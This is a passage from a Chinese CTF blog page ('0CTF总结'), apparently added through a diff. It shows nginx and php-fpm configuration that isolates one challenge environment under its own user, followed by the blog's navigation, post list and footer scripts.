/tmp/php-cgi-ctf5.sock</span></div><div class="line"><span class="meta">#</span><span class="bash"> 修改nginx虚拟主机文件</span></div><div class="line"><span class="meta">$</span><span class="bash"> vim /usr/<span class="built_in">local</span>/nginx/conf/vhost/ctf5.conf</span></div><div class="line">    fastcgi_pass  unix:/tmp/php-cgi-ctf5.sock;    #修改成这样</div><div class="line"><span class="meta">#</span><span class="bash"> 创建php-fpm配置文件</span></div><div class="line"><span class="meta">$</span><span class="bash"> cp /usr/<span class="built_in">local</span>/php/etc/php-fpm.conf /usr/<span class="built_in">local</span>/php/etc/php-fpm-ctf5.conf</span></div><div class="line"><span class="meta">$</span><span class="bash"> vim /usr/<span class="built_in">local</span>/php/etc/php-fpm-ctf5.conf</span></div><div class="line">[global]</div><div class="line">pid = /usr/local/php/var/run/php-fpm-ctf5.pid</div><div class="line">error_log = /usr/local/php/var/log/php-fpm-ctf5.log</div><div class="line">log_level = notice</div><div class="line"></div><div class="line">[ctf5]</div><div class="line">listen = /tmp/php-cgi-ctf5.sock</div><div class="line">listen.backlog = -1</div><div class="line">listen.allowed_clients = 127.0.0.1</div><div class="line">listen.owner = ctf5</div><div class="line">listen.group = ctf5</div><div class="line">listen.mode = 0666</div><div class="line">user = ctf5</div><div class="line">group = ctf5</div><div class="line">pm = dynamic</div><div class="line">pm.max_children = 10</div><div class="line">pm.start_servers = 1</div><div class="line">pm.min_spare_servers = 1</div><div class="line">pm.max_spare_servers = 6</div><div class="line">request_terminate_timeout = 100</div><div class="line">request_slowlog_timeout = 0</div><div class="line">slowlog = var/log/slow-ctf5.log</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> 修改/etc/init.d/php-fpm</span></div><div class="line">vhost=$2</div><div class="line">if [ -n "$vhost" ];then</div><div class="line">        vhost=-$vhost</div><div class="line">fi</div><div class="line">php_fpm_CONF=$&#123;prefix&#125;/etc/php-fpm$vhost.conf</div><div class="line">php_fpm_PID=$&#123;prefix&#125;/var/run/php-fpm$vhost.pid</div><div class="line"></div><div class="line">restart)</div><div class="line">                $0 stop $2</div><div class="line">                $0 start $2</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> 修改文件夹权限</span></div><div class="line"><span class="meta">$</span><span class="bash"> chown ctf5:www -R /home/wwwroot/ctf5</span></div><div class="line"><span class="meta">#</span><span class="bash"> 最后记得重启</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo /etc/init.d/nginx restart</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo /etc/init.d/php-fpm start ctf5</span></div></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/03/14/0x12/">0CTF总结</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-03-14, 10:25:27</p>
+        <p><span>最后更新:</span>2016-03-28, 18:19:17</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/03/14/0x12/" title="0CTF总结">http://0x48.pw/2016/03/14/0x12/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/03/14/0x12/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/03/15/0x13/">
+                    This is AliCTF?
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/03/07/0x11/">
+                    unholy Writeup
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rand-2"><span class="toc-number">1.</span> <span class="toc-text">rand_2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#piapiapia"><span class="toc-number">2.</span> <span class="toc-text">piapiapia</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/03/15/0x13/" title="上一篇: This is AliCTF?">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/03/07/0x11/" title="下一篇: unholy Writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
